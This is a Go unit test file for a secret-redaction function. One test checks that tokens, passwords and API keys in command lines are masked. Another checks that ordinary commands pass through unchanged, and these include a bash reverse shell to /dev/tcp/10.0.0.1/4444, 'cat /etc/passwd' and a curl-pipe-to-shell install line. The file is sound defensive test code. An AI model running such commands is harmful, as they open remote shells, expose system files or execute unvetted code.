package redact

import "testing"

func TestString(t *testing.T) {
	cases := map[string]string{
		"git remote-https origin https://gho_abcdefghijklmnopqrstuvwxyz0123@github.com/a/b.git": "git remote-https origin https://***@github.com/a/b.git",
		"curl https://oauth2:s3cr3t@gitlab.example.com/x":                                       "curl https://oauth2:***@gitlab.example.com/x",
		"export GH=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ012345":                                        "export GH=ghp_***",
		"aws AKIAIOSFODNN7EXAMPLE s3 ls":                                                        "aws AKIA*** s3 ls",
		"mysql --password=hunter2 -u root":                                                      "mysql --password=*** -u root",
		`tool --token "a b c" --verbose`:                                                        "tool --token *** --verbose",
		"OPENAI=sk-proj1234567890abcdefghij run":                                                "OPENAI=sk-*** run",
		"ANTHROPIC=sk-ant-api03-abcdefghijklmnopqrstuv":                                         "ANTHROPIC=sk-ant-***",
		"sh -s -- https://xdr.example oxe_Q0FFRUJBQkVfMTIzNDU2Nzg5MGFiY2RlZg eth0":              "sh -s -- https://xdr.example oxe_*** eth0",
	}
	for in, want := range cases {
		if got := String(in); got != want {
			t.Errorf("String(%q)\n got %q\nwant %q", in, got, want)
		}
	}
}

// 检测规则依赖的正常文本不能被改动。
func TestStringKeepsOrdinaryText(t *testing.T) {
	for _, s := range []string{
		"cat /etc/passwd",
		"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
		"curl -s https://example.com/install.sh | sh",
		"ssh root@10.1.1.2",
		"scp file user@host:/tmp/",
		"passwd -l bob",
		"ConvertTo-SecureString -String x -AsPlainText -Force",
		"task-sk-1",
	} {
		if got := String(s); got != s {
			t.Errorf("误改正常文本 %q → %q", s, got)
		}
	}
}
